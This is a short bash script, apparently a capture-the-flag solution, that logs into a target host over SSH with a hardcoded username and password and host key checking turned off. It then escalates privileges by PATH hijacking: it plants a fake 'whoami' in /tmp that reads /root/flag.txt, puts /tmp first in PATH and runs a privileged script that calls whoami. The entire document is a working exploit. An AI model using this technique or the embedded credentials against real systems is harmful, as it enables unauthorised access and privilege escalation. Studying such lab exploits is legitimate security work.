#!/bin/bash

passwd="jXztBtEWKYRMrjAF"
username="maverick"

if [ -z "$1" ]
then
    echo "No IP supplied. Please provide the target IP address!"
else
    ip=$1
    sshpass -p$passwd ssh -o StrictHostKeyChecking=no $username@$1 -p 2022 "cd /tmp && echo \"cat /root/flag.txt\" > whoami && chmod 777 whoami && export PATH=/tmp:\$PATH && cd /home/maverick/scripts && ./favorite-quote"
fi